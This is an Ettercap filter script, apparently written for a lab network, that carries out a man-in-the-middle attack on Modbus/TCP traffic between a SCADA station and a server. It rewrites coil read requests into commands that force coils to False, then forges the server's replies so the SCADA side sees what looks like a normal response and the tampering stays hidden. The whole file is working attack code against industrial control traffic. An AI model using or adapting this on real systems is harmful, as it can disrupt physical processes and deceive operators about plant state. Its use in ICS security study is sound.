# Help from https://github.com/Ettercap/ettercap/blob/master/share/etter.filter.examples

#Run the filter; target IPs must be hard-coded
if (ip.proto == TCP) {
    # Packet is coming from SCADA and going to Server-2
    if (ip.src == '192.168.56.105' && ip.dst == '192.168.56.106'){
        # If this packet is a coil read request
        if (search(DATA.data,"\x00\x06\x01\x01\x00\x00\x00\x08")){
            # Replace read request with write coils to False
            replace("\x00\x06\x01\x01\x00\x00\x00\x08","\x00\x08\x01\x0f\x00\x00\x00\x08\x01\x00");            

            msg("Found coil read, replaced with coil write to False.");
        }
    }

    # Packet is coming from Server-2 and going to SCADA
    if (ip.src == '192.168.56.106' && ip.dst == '192.168.56.105') {
        msg("Qualifies for falsification.");

        #drop();

        #Force valid response packet to client
        if (search(DATA.data, "\x00\x06\x01\x0f\x00\x00\x00\x08")){
            replace("\x00\x06\x01\x0f\x00\x00\x00\x08","\x00\x04\x01\x01\x01\xff");
        }
    }
}